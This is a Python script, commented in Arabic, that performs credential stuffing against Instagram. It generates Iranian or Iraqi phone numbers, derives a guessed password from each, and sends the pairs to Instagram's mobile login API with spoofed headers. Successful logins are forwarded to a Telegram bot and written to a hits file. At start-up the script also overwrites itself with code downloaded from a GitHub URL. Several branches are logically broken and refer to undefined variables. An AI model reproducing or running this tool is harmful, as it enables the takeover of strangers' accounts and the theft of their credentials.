import requests, os, sys

# رابط الملف من GitHub (Raw)
UPDATE_URL = "https://raw.githubusercontent.com/hussainalgoker-alt/B7H/main/B7HRM.PY"
LOCAL_FILE = sys.argv[0]

def check_update():
    try:
        print("🔄 فحص التحديثات...")
        online_code = requests.get(UPDATE_URL).text

        with open(LOCAL_FILE, "r", encoding="utf-8") as f:
            local_code = f.read()

        if online_code.strip() != local_code.strip():
            print("✨ يوجد تحديث جديد! يتم التحديث الآن...")
            with open(LOCAL_FILE, "w", encoding="utf-8") as f:
                f.write(online_code)
            print("✅ تم تحديث الأداة بنجاح! أعد تشغيلها الآن.")
            sys.exit()
        else:
            print("✅ الأداة محدثة لآخر إصدار.")
    except Exception as e:
        print("⚠️ لم يتمكن من فحص التحديث:", e)

check_update()
import webbrowser
import os
import pyfiglet
# = = = = = = = = = = = = 

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    
B ='\033[1;92m'
l = pyfiglet.figlet_format('     RXHEO   ')
banner = X+l+Z
print(banner)
def close():
    input('- Press Enter To Exit /')
    sys.exit()
h , b,s,block = 0,0,0,0
ask = input("""
[1] Iran
[2] iraq
= = = = = =
[+] ChOiCe OnE » """)
if ask == "1":
	print()
	tele = 'y' or 'Y'
	if "Y" in tele:
	    id = input(F+"[+] Id Tele : ")
	    print('')
	    bot = input(F+"[+] Token Bot : ")
	elif "y" in tele:
	    id = input(F+"[+] Id Tele : ")
	    print('')
	    bot = input(F+"[+] Token Bot  : ")
	    print()
	    print('= = = = = = = = = = = ')
	    kl = '1'
	print()
	print('===============================')
	print('')
	ask = 'y' or 'Y'
	print('')
	#-------------------------------------------------------
	if kl == "1":               
	    make = '0123456789'
	    print('')
	    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User :  \n [=] Pass :  ",end='')
	
	    while True:
	        us = str(''.join((random.choice(make) for i in range(7))))
	        user = '+98913' + us
	        pasw = '0913' + us
	        #print(f"\n{user} \n {pasw}")
	        req = requests.session()
	        log_head = {
	        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
	        'Accept': "*/*",
	        'Cookie': 'missing',
	        'Accept-Encoding': 'gzip, deflate',
	        'Accept-Language': 'en-US',
	        'X-IG-Capabilities': '3brTvw==',
	        'X-IG-Connection-Type': 'WIFI',
	        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	        'Host': 'i.instagram.com'}
	        uid = str(uuid4())
	        log_data = {
	            'uuid': uid,
	            'password': pasw,
	            'username': user,
	            'device_id': uid,
	            'from_reg': 'false',
	            '_csrftoken': 'missing',
	            'login_attempt_countn': '0'}
	        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
	        #print(r.text)
	        if "logged_in_user" in r.text:
	            if "Y" or "y" in tele:
	                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=uuuu \n======================\n[=] يوزر » {user} \n[=] باسورد » {pasw} \n======================\n𝑩𝒀 : @GG4RT ~ @llIljlIl ")
	            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
	            h += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'challenge_required' or 'two' in log.text:
	            s += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'Please wait a few minutes' in log.text:
	            block += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'Bad request' in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        else:
	            b+=1
	            os.system('cls' if os.name == 'nt' else 'clear')    
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	            
if ask == "2":
	print()
	tele = 'y' or 'Y'
	if "Y" in tele:
	    id = input(F+"[+] Id Tele : ")
	    print('')
	    bot = input(F+"[+] Token Bot : ")
	elif "y" in tele:
	    id = input(F+"[+] Id Tele : ")
	    print('')
	    bot = input(F+"[+] Token Bot  : ")
	    print()
	    print('= = = = = = = = = = = ')
	    kl = '1'
	print()
	print('===============================')
	print('')
	ask = 'y' or 'Y'
	print('')
	#-------------------------------------------------------
	if kl == "1":               
	    make = '0123456789'
	    print('')
	    print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User :  \n [=] Pass :  ",end='')
	
	    while True:
	        us = str(''.join((random.choice(make) for i in range(7))))
	        user = '+964750p' + us
	        pasw = '0750' + us
	        #print(f"\n{user} \n {pasw}")
	        req = requests.session()
	        log_head = {
	        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
	        'Accept': "*/*",
	        'Cookie': 'missing',
	        'Accept-Encoding': 'gzip, deflate',
	        'Accept-Language': 'en-US',
	        'X-IG-Capabilities': '3brTvw==',
	        'X-IG-Connection-Type': 'WIFI',
	        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	        'Host': 'i.instagram.com'}
	        uid = str(uuid4())
	        log_data = {
	            'uuid': uid,
	            'password': pasw,
	            'username': user,
	            'device_id': uid,
	            'from_reg': 'false',
	            '_csrftoken': 'missing',
	            'login_attempt_countn': '0'}
	        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
	        #print(r.text)
	        if "logged_in_user" in r.text:
	            if "Y" or "y" in tele:
	                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ku \n======================\n[=] يوزر » {user} \n[=] باسورد » {pasw} \n======================\n𝑩𝒀 : @GG4RT ~ @llIljlIl ")
	            open("Hits.txt","a").write(f"{user}:{pasw}\n") 
	            h += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                 \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                          \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'challenge_required' or 'two' in log.text:
	            s += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'Please wait a few minutes' in log.text:
	            block += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        elif 'Bad request' in log.text:
	            b += 1
	            os.system('cls' if os.name == 'nt' else 'clear')
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
	        else:
	            b+=1
	            os.system('cls' if os.name == 'nt' else 'clear')    
	            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n _[=] Block : {block} \n [=] User : {user} \n [=] Pass : {pasw} ",end='')
